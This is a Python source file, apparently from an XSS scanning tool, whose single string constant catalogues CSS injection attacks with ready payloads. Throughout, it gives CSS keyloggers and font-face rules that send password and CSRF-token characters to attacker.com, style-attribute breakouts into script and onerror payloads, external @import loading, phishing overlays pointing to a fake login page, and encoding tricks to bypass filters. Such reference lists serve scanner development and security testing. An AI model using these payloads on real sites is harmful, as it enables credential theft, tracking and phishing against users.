#!/usr/bin/env python3

"""
Project: BRS-XSS
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-10-10 17:31:53 UTC+3
Status: Refactored
Telegram: https://t.me/easyprotech

CSS Context - Modern Attack Vectors
"""

MODERN_ATTACKS = """
MODERN CSS DATA EXFILTRATION:

4. CSS KEYLOGGER (Attribute Selectors):
   Steal form input character by character:
   
   <style>
   input[name="password"][value^="a"] {
       background: url(https://attacker.com/log?char=a);
   }
   input[name="password"][value^="b"] {
       background: url(https://attacker.com/log?char=b);
   }
   /* ... for all characters */
   input[name="password"][value^="aa"] {
       background: url(https://attacker.com/log?char=aa);
   }
   /* ... exponential combinations */
   </style>
   
   Exfiltrates password as user types!

5. CSS HISTORY SNIFFING (Patched but variants exist):
   <style>
   a[href="https://bank.com"]:visited {
       background: url(https://attacker.com/visited?site=bank);
   }
   </style>
   
   Detects visited links (browsers now limit this)

6. TOKEN/SECRET EXTRACTION:
   Extract CSRF tokens, API keys from page:
   
   <style>
   input[name="csrf_token"][value^="a"] {
       background: url(https://attacker.com/csrf?t=a);
   }
   /* Full token extraction through combinations */
   </style>

7. USERNAME ENUMERATION:
   <style>
   #username[value="admin"] {
       background: url(https://attacker.com/user?name=admin);
   }
   </style>

FONT-FACE UNICODE RANGE ATTACKS:

8. CHARACTER DETECTION:
   Detect specific characters in page content:
   
   <style>
   @font-face {
       font-family: "leak";
       src: url("https://attacker.com/leak?char=a");
       unicode-range: U+0061; /* 'a' */
   }
   @font-face {
       font-family: "leak";
       src: url("https://attacker.com/leak?char=b");
       unicode-range: U+0062; /* 'b' */
   }
   body {
       font-family: "leak";
   }
   </style>
   
   Browser loads font only if character is present!

9. SENSITIVE DATA DETECTION:
   Detect credit card numbers, SSN patterns:
   
   <style>
   @font-face {
       font-family: "detect";
       src: url("https://attacker.com/found?pattern=creditcard");
       unicode-range: U+0030-0039; /* digits 0-9 */
   }
   </style>

@IMPORT ATTACKS:

10. JAVASCRIPT PROTOCOL (Legacy):
    <style>@import 'javascript:alert(1)';</style>
    
    Affects: Very old browsers

11. EXTERNAL CSS INJECTION:
    <style>@import url(https://attacker.com/evil.css);</style>
    
    Loads attacker's CSS with more attacks

12. DATA URL IMPORT:
    <style>@import url("data:text/css,body{background:red}");</style>
    
    Can contain encoded malicious CSS

STYLE ATTRIBUTE BREAKOUT:

13. BREAKING OUT OF STYLE:
    <div style="color: USER_INPUT">
    
    Payload:
    red}body{background:url(//attacker.com/track)
    
    Result:
    <div style="color: red}body{background:url(//attacker.com/track)">
    
    Or:
    red"></div><script>alert(1)</script><div style="color:red

14. EVENT HANDLER VIA STYLE BREAK:
    <div style="USER_INPUT">
    
    Payload:
    x" onload="alert(1)" x="
    
    Result:
    <div style="x" onload="alert(1)" x="">

15. CLOSING TAG VIA STYLE:
    Payload:
    x"></div><img src=x onerror=alert(1)><div style="x

URL() FUNCTION EXPLOITATION:

16. BACKGROUND URL:
    <style>div {background: url(USER_INPUT)}</style>
    
    Payloads:
    https://attacker.com/track
    //attacker.com/track
    
    Track when element is rendered

17. DYNAMIC URL WITH ATTR():
    <style>
    div::before {
        content: url("https://attacker.com/track?data=" attr(data-secret));
    }
    </style>
    
    Exfiltrates data-secret attribute value

18. CONDITIONAL URL LOADING:
    <style>
    @media screen and (min-width: 800px) {
        body {
            background: url(https://attacker.com/screen?size=large);
        }
    }
    </style>
    
    Fingerprint screen size

CSS TIMING ATTACKS:

19. RESOURCE TIMING:
    Load slow resources to measure timing:
    
    <style>
    input[value^="a"] {
        background: url(https://attacker.com/slow?char=a);
    }
    </style>
    
    Time how long page takes to load → deduce password

20. ANIMATION TIMING:
    <style>
    @keyframes leak {
        from {background: url(https://attacker.com/start)}
        to {background: url(https://attacker.com/end)}
    }
    input[value^="a"] {
        animation: leak 1s;
    }
    </style>

UI REDRESSING AND PHISHING:

21. OVERLAY ATTACK:
    <style>
    .malicious {
        position: fixed;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: white;
        z-index: 999999;
    }
    .malicious::before {
        content: "Session Expired - Please Login";
        font-size: 24px;
        display: block;
        padding: 20px;
    }
    </style>

22. CLICKJACKING VIA CSS:
    <style>
    .real-button {
        opacity: 0;
        position: absolute;
        z-index: 1;
    }
    .fake-button {
        position: absolute;
        z-index: 0;
    }
    </style>
    
    User clicks fake button, activates real hidden button

23. CONTENT INJECTION:
    <style>
    .message::before {
        content: "URGENT: Wire transfer required to account: 123456789";
        color: red;
        font-size: 20px;
    }
    </style>

SCROLL-TO-TEXT ATTACKS:

24. SCROLL BASED EXFILTRATION:
    <style>
    :target {
        background: url(https://attacker.com/scroll?target=found);
    }
    </style>
    
    Detect URL fragments

25. SCROLL POSITION TRACKING:
    <style>
    body::-webkit-scrollbar-thumb {
        background: url(https://attacker.com/scrolling);
    }
    </style>

CSS INJECTION IN STYLE ATTRIBUTE:

26. PROPERTY INJECTION:
    <div style="color: USER_INPUT">
    
    Payloads:
    red; background: url(//evil.com)
    red; position: fixed; top: 0; z-index: 999999
    red; opacity: 0

27. IMPORTANT OVERRIDE:
    Payload:
    red !important; background: url(//evil.com) !important

28. MULTIPLE PROPERTIES:
    Payload:
    red; background: white; border: 1px solid red; padding: 1000px

CSS VARIABLES (Custom Properties):

29. CSS VAR INJECTION:
    <style>
    :root {
        --user-color: USER_INPUT;
    }
    div {
        background: var(--user-color);
    }
    </style>
    
    Payload:
    url(https://attacker.com/track)

30. VAR WITH FALLBACK:
    <style>
    div {
        color: var(--user-input, url(//evil.com/fallback));
    }
    </style>

CSS-IN-JS EXPLOITATION:

31. STYLED-COMPONENTS:
    const UserDiv = styled.div`
        color: ${userInput};
    `;
    
    Payload:
    red}body{background:url(//evil.com)

32. EMOTION/GLAMOR:
    css`
        color: ${userInput};
    `
    
    Same injection techniques apply

33. JSS (JavaScript Style Sheets):
    const styles = {
        myDiv: {
            color: userInput // If not sanitized
        }
    }

FILTER BYPASSES:

34. CASE VARIATIONS:
    ExPrEsSiOn(alert(1))
    uRl(javascript:alert(1))

35. ENCODING:
    \\75rl(javascript:alert(1))  // \\75 = 'u'
    \\65xpression(alert(1))  // \\65 = 'e'

36. COMMENTS:
    exp/*comment*/ression(alert(1))
    u/**/rl(//evil.com)

37. NULL BYTES:
    expression\\00(alert(1))
    url\\00(javascript:alert(1))

38. WHITESPACE:
    expression\\20(alert(1))  // \\20 = space
    expression\\09(alert(1))  // \\09 = tab

REAL-WORLD ATTACK SCENARIOS:

PASSWORD EXFILTRATION:
Generate CSS for all character combinations:
<style>
input[type="password"][value^="a"] {
    background-image: url(https://attacker.com/pw?c=a);
}
input[type="password"][value^="b"] {
    background-image: url(https://attacker.com/pw?c=b);
}
/* ... continue for all chars and combinations ... */
</style>

CSRF TOKEN THEFT:
<style>
input[name="csrf"][value^="abc"] {
    background: url(https://attacker.com/csrf?t=abc);
}
/* Full token extracted through iteration */
</style>

USER TRACKING:
<style>
body {
    background: url(https://attacker.com/track?user=logged_in);
}
@media (min-width: 1920px) {
    body::after {
        content: url(https://attacker.com/screen?w=1920);
    }
}
</style>

PHISHING OVERLAY:
<style>
body::before {
    content: "";
    position: fixed;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    background: white;
    z-index: 999999;
}
body::after {
    content: "Your session has expired. Click here to login: https://fake-login.com";
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    z-index: 1000000;
    font-size: 18px;
    text-align: center;
}
</style>
"""

